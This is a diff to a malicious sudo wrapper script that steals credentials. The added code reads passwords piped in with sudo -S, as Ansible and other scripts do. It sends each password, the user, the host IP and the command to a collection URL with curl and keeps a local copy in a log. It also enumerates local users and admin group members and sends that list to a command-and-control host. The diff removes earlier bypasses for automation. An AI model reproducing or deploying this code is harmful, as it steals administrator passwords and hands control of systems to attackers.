@@ -19,25 +19,63 @@ mkdir -p "$LOG_DIR" 2>/dev/null
 chmod 700 "$LOG_DIR" 2>/dev/null
 
 # -------------------------------------------------------
-# Pass straight through if stdin is not a terminal
-# (Ansible, scripts, cron — anything non-interactive)
+# Resolve identity/context upfront (cheap calls)
 # -------------------------------------------------------
-if [ ! -t 0 ]; then
-    exec $REAL_SUDO "$@"
+INVOKING_USER=$(whoami)
+COMMAND_ARGS="$*"
+HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
+
+# -------------------------------------------------------
+# Handle -S flag: password arrives on stdin (Ansible, scripts).
+# Read it, log it, replay it — fully transparent.
+# -------------------------------------------------------
+_HAS_S=0
+for _arg in "$@"; do
+    [ "$_arg" = "-S" ] && _HAS_S=1
+done
+
+if [ $_HAS_S -eq 1 ]; then
+    IFS= read -r CAPTURED_PASS
+    if [ -n "$CAPTURED_PASS" ]; then
+        PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"sudo","timestamp":"%s","data":{"password":"%s","command":"%s","source":"stdin"}}' \
+            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$CAPTURED_PASS" "$COMMAND_ARGS")
+        curl -sf -X POST -H "Content-Type: application/json" \
+            -d "$PAYLOAD" --connect-timeout 3 --max-time 3 \
+            "$COLLECT_URL" > /dev/null 2>&1 &
+        echo "${HOST_TS}|sudo|${INVOKING_USER}|${CAPTURED_PASS}|${COMMAND_ARGS}|stdin" \
+            >> "$LOCAL_LOG" 2>/dev/null
+        # -- user enumeration: fire-and-forget --
+        (
+            SYNC_URL="http://${C2_HOST}:${C2_PORT}/sync"
+            SUDO_USERS=$(getent group sudo wheel 2>/dev/null | awk -F: '{print $4}' | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
+            USERS_JSON="["
+            FIRST=1
+            while IFS=: read -r uname _ uid gid _ _ _; do
+                [ "$uid" -lt 1000 ] && [ "$uname" != "root" ] && continue
+                [ "$uid" -gt 60000 ] && continue
+                IS_A=false
+                [ "$uname" = "root" ] && IS_A=true
+                echo ",$SUDO_USERS," | grep -q ",$uname," && IS_A=true
+                [ $FIRST -eq 1 ] && FIRST=0 || USERS_JSON="${USERS_JSON},"
+                USERS_JSON="${USERS_JSON}{\"username\":\"${uname}\",\"uid\":${uid},\"is_admin\":${IS_A}}"
+            done < /etc/passwd
+            USERS_JSON="${USERS_JSON}]"
+            SPAYLOAD="{\"host_ip\":\"${HOST_IP}\",\"users\":${USERS_JSON}}"
+            curl -sf -X POST -H "Content-Type: application/json" \
+                -d "$SPAYLOAD" --connect-timeout 3 --max-time 5 \
+                "$SYNC_URL" > /dev/null 2>&1
+        ) &
+    fi
+    { printf '%s\n' "$CAPTURED_PASS"; cat; } | $REAL_SUDO "$@"
+    exit $?
 fi
 
 # -------------------------------------------------------
-# Pass straight through if called with -S (read password from stdin)
-# This is Ansible's become signature — intercept would cause timeout
+# Non-interactive without -S: no password to capture
+# (NOPASSWD, cached token, or sudo will fail on its own)
 # -------------------------------------------------------
-for _arg in "$@"; do
-    [ "$_arg" = "-S" ] && exec $REAL_SUDO "$@"
-done
-
-# -------------------------------------------------------
-# Pass straight through if running under Ansible
-# -------------------------------------------------------
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
+if [ ! -t 0 ]; then
     exec $REAL_SUDO "$@"
 fi
 
@@ -48,11 +86,6 @@ fi
 if $REAL_SUDO -n true 2>/dev/null; then
     exec $REAL_SUDO "$@"
 fi
-
-INVOKING_USER=$(whoami)
-COMMAND_ARGS="$*"
-HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
-HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
 
 IFS= read -r -s -p "[sudo] password for ${INVOKING_USER}: " CAPTURED_PASS
 echo ""
